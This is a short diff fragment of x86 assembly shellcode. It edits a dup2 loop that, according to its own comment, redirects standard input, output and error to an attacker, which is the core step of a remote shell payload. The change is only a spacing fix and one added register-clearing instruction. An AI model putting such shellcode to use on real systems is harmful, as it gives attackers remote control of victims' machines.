@@ -17,8 +17,8 @@ _start:
 
  ; dup (redirect in, out, err to the attacker)
     mov ebx, eax ; store returned fd from previous syscall (satisfy arg1)
-    xor ecx,ecx
-
+    xor ecx, ecx
+    xor eax, eax
 loop:
     xor eax, eax
     mov al, 63
